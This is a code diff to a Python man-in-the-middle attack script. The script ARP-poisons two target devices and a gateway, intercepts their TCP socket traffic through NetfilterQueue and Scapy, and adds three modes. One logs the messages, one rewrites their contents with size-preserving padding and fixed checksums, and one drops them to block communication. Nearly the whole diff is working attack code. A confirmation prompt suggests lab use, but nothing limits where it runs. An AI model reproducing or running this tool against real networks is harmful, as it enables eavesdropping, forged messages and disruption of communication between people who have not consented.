@@ -29,6 +29,9 @@ SOCKET_PORTS = AttackConfig.SOCKET_PORTS
 ENABLE_BIDIRECTIONAL_INTERCEPTION = AttackConfig.ENABLE_BIDIRECTIONAL_INTERCEPTION
 SOCKET_MODIFICATIONS = AttackConfig.SOCKET_MODIFICATIONS
 
+# TCP Attack Mode configuration
+TCP_ATTACK_MODE = AttackConfig.TCP_ATTACK_MODE
+
 # Setup detailed logging
 logging.basicConfig(
     level=logging.INFO,
@@ -128,7 +131,7 @@ def restore_arp_tables(device1, device2, gateway):
     logger.info(f"[ARP-RESTORE] Restored ARP tables for {device1.name}, {device2.name}, and {gateway.name}")
 
 def modify_bidirectional_packet(packet):
-    """Main packet modification function for bidirectional TCP socket traffic"""
+    """Main packet modification function for bidirectional TCP socket traffic with three modes"""
     scapy_pkt = IP(packet.get_payload())
     
     src_ip = scapy_pkt.src
@@ -167,61 +170,97 @@ def modify_bidirectional_packet(packet):
         return
     
     # Determine communication direction
-    direction = "Unknown"
-    if src_ip == target_1.ip and dst_ip == target_2.ip:
-        direction = f"{target_1.name} → {target_2.name}"
-    elif src_ip == target_2.ip and dst_ip == target_1.ip:
-        direction = f"{target_2.name} → {target_1.name}"
-    elif src_ip == target_1.ip:
-        direction = f"{target_1.name} → Gateway"
-    elif src_ip == target_2.ip:
-        direction = f"{target_2.name} → Gateway"
-    elif dst_ip == target_1.ip:
-        direction = f"Gateway → {target_1.name}"
-    elif dst_ip == target_2.ip:
-        direction = f"Gateway → {target_2.name}"
+    direction = get_communication_direction(src_ip, dst_ip)
         
-    # Log all socket traffic
-    logger.info(f"[SOCKET-TRAFFIC] 🎯 {direction} | {src_ip}:{tcp_layer.sport} -> {dst_ip}:{tcp_layer.dport}")
-    
     try:
         # Try to decode the payload as text
         message = payload.decode('utf-8', errors='ignore')
         
         if message.strip():
-            logger.warning(f"[SOCKET-MESSAGE] 📨 {direction} | Intercepted: '{message.strip()}'")
-            logger.info(f"[SOCKET-DEBUG] Original packet size: {len(payload)} bytes")
-            
-            if ENABLE_BIDIRECTIONAL_INTERCEPTION:
-                # Modify the message using configured modifications
-                modified_message = modify_socket_message(message, direction)
-                
-                if modified_message != message:
-                    logger.info(f"[SOCKET-MODIFY] 🔧 {direction} | Original: '{message.strip()}'")
-                    logger.info(f"[SOCKET-MODIFY] 🔧 {direction} | Modified: '{modified_message.strip()}'")
-                    
-                    # Handle payload size changes - maintain original size for TCP stability
-                    modified_payload = pad_to_original_size(modified_message.encode('utf-8'), len(payload))
-                    logger.info(f"[SOCKET-DEBUG] Modified packet size: {len(modified_payload)} bytes (preserved original: {len(payload)} bytes)")
-                    
-                    # Update packet with modified payload
-                    scapy_pkt[Raw].load = modified_payload
-                    
-                    # Recalculate checksums (length stays the same)
-                    del scapy_pkt[IP].len
-                    del scapy_pkt[IP].chksum
-                    del scapy_pkt[TCP].chksum
-                    
-                    packet.set_payload(bytes(scapy_pkt))
-                    logger.info(f"[SOCKET-MODIFY] ✅ {direction} | Message successfully modified!")
-                else:
-                    logger.info(f"[SOCKET-MODIFY] ⏸️ {direction} | No modifications applied")
+            # Handle different TCP attack modes
+            if TCP_ATTACK_MODE == "MONITOR":
+                handle_monitor_mode(direction, src_ip, dst_ip, tcp_layer, message, packet)
+            elif TCP_ATTACK_MODE == "TAMPER":
+                handle_tamper_mode(direction, src_ip, dst_ip, tcp_layer, message, payload, scapy_pkt, packet)
+            elif TCP_ATTACK_MODE == "DROP":
+                handle_drop_mode(direction, src_ip, dst_ip, tcp_layer, message, packet)
+            else:
+                logger.warning(f"[CONFIG] Unknown TCP_ATTACK_MODE: {TCP_ATTACK_MODE}, defaulting to MONITOR")
+                handle_monitor_mode(direction, src_ip, dst_ip, tcp_layer, message, packet)
+        else:
+            packet.accept()
             
     except UnicodeDecodeError:
         # Handle binary data
-        logger.info(f"[SOCKET-BINARY] 📦 {direction} | Binary data: {len(payload)} bytes")
-        
+        if TCP_ATTACK_MODE == "DROP":
+            logger.info(f"[DROP] ❌ {direction} | Binary data dropped ({len(payload)} bytes)")
+            packet.drop()
+        else:
+            logger.info(f"[{TCP_ATTACK_MODE}] 📦 {direction} | Binary data: {len(payload)} bytes")
+            packet.accept()
+
+def get_communication_direction(src_ip, dst_ip):
+    """Determine the communication direction between devices"""
+    if src_ip == target_1.ip and dst_ip == target_2.ip:
+        return f"{target_1.name} → {target_2.name}"
+    elif src_ip == target_2.ip and dst_ip == target_1.ip:
+        return f"{target_2.name} → {target_1.name}"
+    elif src_ip == target_1.ip:
+        return f"{target_1.name} → Gateway"
+    elif src_ip == target_2.ip:
+        return f"{target_2.name} → Gateway"
+    elif dst_ip == target_1.ip:
+        return f"Gateway → {target_1.name}"
+    elif dst_ip == target_2.ip:
+        return f"Gateway → {target_2.name}"
+    else:
+        return f"{src_ip} → {dst_ip}"
+
+def handle_monitor_mode(direction, src_ip, dst_ip, tcp_layer, message, packet):
+    """Handle MONITOR mode - clean logging without modification"""
+    timestamp = datetime.now().strftime('%H:%M:%S')
+    logger.info(f"[MONITOR] 👁️  {timestamp} | {direction} | {src_ip}:{tcp_layer.sport} → {dst_ip}:{tcp_layer.dport}")
+    logger.info(f"[MONITOR] 💬 Message: '{message.strip()}'")
     packet.accept()
+
+def handle_tamper_mode(direction, src_ip, dst_ip, tcp_layer, message, payload, scapy_pkt, packet):
+    """Handle TAMPER mode - modify messages as configured"""
+    timestamp = datetime.now().strftime('%H:%M:%S')
+    logger.info(f"[TAMPER] 🔧 {timestamp} | {direction} | {src_ip}:{tcp_layer.sport} → {dst_ip}:{tcp_layer.dport}")
+    logger.info(f"[TAMPER] 📨 Original: '{message.strip()}'")
+    
+    if ENABLE_BIDIRECTIONAL_INTERCEPTION:
+        # Modify the message using configured modifications
+        modified_message = modify_socket_message(message, direction)
+        
+        if modified_message != message:
+            logger.info(f"[TAMPER] 🎯 Modified: '{modified_message.strip()}'")
+            
+            # Handle payload size changes - maintain original size for TCP stability
+            modified_payload = pad_to_original_size(modified_message.encode('utf-8'), len(payload))
+            
+            # Update packet with modified payload
+            scapy_pkt[Raw].load = modified_payload
+            
+            # Recalculate checksums (length stays the same)
+            del scapy_pkt[IP].len
+            del scapy_pkt[IP].chksum
+            del scapy_pkt[TCP].chksum
+            
+            packet.set_payload(bytes(scapy_pkt))
+            logger.info(f"[TAMPER] ✅ Message successfully modified and forwarded!")
+        else:
+            logger.info(f"[TAMPER] ⏸️  No modifications applied")
+    
+    packet.accept()
+
+def handle_drop_mode(direction, src_ip, dst_ip, tcp_layer, message, packet):
+    """Handle DROP mode - drop packets with clear logging"""
+    timestamp = datetime.now().strftime('%H:%M:%S')
+    logger.info(f"[DROP] ❌ {timestamp} | {direction} | {src_ip}:{tcp_layer.sport} → {dst_ip}:{tcp_layer.dport}")
+    logger.info(f"[DROP] 🚫 DROPPED: '{message.strip()}'")
+    logger.info(f"[DROP] ✂️  Packet intercepted and discarded")
+    packet.drop()
 
 def pad_to_original_size(modified_payload, original_size):
     """Preserve original packet size to maintain TCP sequence numbers"""
@@ -288,14 +327,27 @@ def start_bidirectional_interception():
     nfqueue = NetfilterQueue()
     nfqueue.bind(0, modify_bidirectional_packet)
     
+    mode_descriptions = {
+        "MONITOR": "👁️  Monitoring and logging",
+        "TAMPER": "🔧 Intercepting and modifying", 
+        "DROP": "❌ Intercepting and dropping"
+    }
+    
     logger.info("[MITM] 🚀 Bidirectional TCP Socket interception system started")
-    logger.info("[MITM] 📡 Monitoring socket traffic on ports: " + str(SOCKET_PORTS))
+    logger.info(f"[MITM] {mode_descriptions.get(TCP_ATTACK_MODE, '🎯 Processing')} socket traffic on ports: {SOCKET_PORTS}")
     logger.info(f"[MITM] 🎯 Target 1: {target_1}")
     logger.info(f"[MITM] 🎯 Target 2: {target_2}")
     logger.info(f"[MITM] 🌐 Gateway: {gateway_device}")
-    logger.info(f"[MITM] 🔧 Bidirectional: {'Enabled' if ENABLE_BIDIRECTIONAL_INTERCEPTION else 'Disabled'}")
-    logger.info(f"[MITM] 🔀 Modifications: {SOCKET_MODIFICATIONS}")
-    logger.info("[MITM] 💡 Compact modifications preserve TCP packet sizes")
+    logger.info(f"[MITM] 🔧 Mode: {TCP_ATTACK_MODE}")
+    
+    if TCP_ATTACK_MODE == "TAMPER":
+        logger.info(f"[MITM] 🔀 Modifications: {SOCKET_MODIFICATIONS}")
+        logger.info("[MITM] 💡 Modifications preserve TCP packet sizes")
+    elif TCP_ATTACK_MODE == "MONITOR":
+        logger.info("[MITM] 👁️  Passive monitoring - no packet modification")
+    elif TCP_ATTACK_MODE == "DROP":
+        logger.info("[MITM] ❌ Aggressive blocking - all target packets dropped")
+    
     logger.info("[MITM] 🛑 Press Ctrl+C to stop and cleanup")
     
     try:
@@ -318,21 +370,45 @@ def display_configuration():
     print(f"Gateway Device:         {gateway_device}")
     print(f"Socket Ports:           {SOCKET_PORTS}")
     print(f"Bidirectional Mode:     {'Enabled' if ENABLE_BIDIRECTIONAL_INTERCEPTION else 'Disabled'}")
-    print(f"Message Modifications:  {SOCKET_MODIFICATIONS}")
+    print(f"TCP Attack Mode:        {TCP_ATTACK_MODE}")
+    
+    if TCP_ATTACK_MODE == "TAMPER":
+        print(f"Message Modifications:  {SOCKET_MODIFICATIONS}")
+    
     print("=" * 70)
     print("📋 Communication Patterns:")
     print(f"  • {target_1.name} ↔ {target_2.name} (Direct)")
     print(f"  • {target_1.name} → Gateway → {target_2.name} (Routed)")
     print(f"  • {target_2.name} → Gateway → {target_1.name} (Routed)")
     print("=" * 70)
-    print("🔧 TCP Packet Handling:")
-    print("  • Uses configured replacements with size preservation")
-    print(f"  • Current modifications: {SOCKET_MODIFICATIONS}")
-    print("  • Replacements truncated if needed to fit packet size")
+    
+    # Mode-specific information
+    if TCP_ATTACK_MODE == "MONITOR":
+        print("👁️  MONITOR Mode:")
+        print("  • Intercepts and logs all TCP messages")
+        print("  • No packet modification or dropping")
+        print("  • Clean, timestamped logs for monitoring")
+    elif TCP_ATTACK_MODE == "TAMPER":
+        print("🔧 TAMPER Mode:")
+        print("  • Intercepts and modifies TCP messages")
+        print(f"  • Current modifications: {SOCKET_MODIFICATIONS}")
+        print("  • Preserves packet sizes for TCP stability")
+    elif TCP_ATTACK_MODE == "DROP":
+        print("❌ DROP Mode:")
+        print("  • Intercepts and drops all target TCP messages")
+        print("  • Blocks communication between target devices")
+        print("  • Logs dropped packets with red cross indicators")
+        print("  • Shows all TCP retransmission attempts being blocked")
+    
     print("=" * 70)
     
     if SecurityConfig.REQUIRE_CONFIRMATION:
-        response = input("🤔 Proceed with bidirectional socket interception? (yes/no): ")
+        mode_description = {
+            "MONITOR": "monitor (log only)",
+            "TAMPER": "tamper with (modify)",
+            "DROP": "drop (block)"
+        }
+        response = input(f"🤔 Proceed to {mode_description.get(TCP_ATTACK_MODE, 'process')} TCP socket traffic? (yes/no): ")
         if response.lower() not in ['yes', 'y']:
             print("❌ Attack cancelled by user")
             sys.exit(0)
@@ -341,7 +417,14 @@ def main():
     """Main function"""
     display_configuration()
     
-    logger.info("[ATTACK] 🚀 Starting bidirectional ARP poisoning & TCP socket interception")
+    mode_actions = {
+        "MONITOR": "monitoring & logging",
+        "TAMPER": "intercepting & modifying",
+        "DROP": "intercepting & dropping"
+    }
+    
+    logger.info(f"[ATTACK] 🚀 Starting bidirectional ARP poisoning & TCP socket {mode_actions.get(TCP_ATTACK_MODE, 'processing')}")
+    logger.info(f"[ATTACK] 🔧 TCP Mode: {TCP_ATTACK_MODE}")
     logger.info(f"[ATTACK] Attacker MAC: {get_if_hwaddr(interface)}")
     
     enable_ip_forwarding()
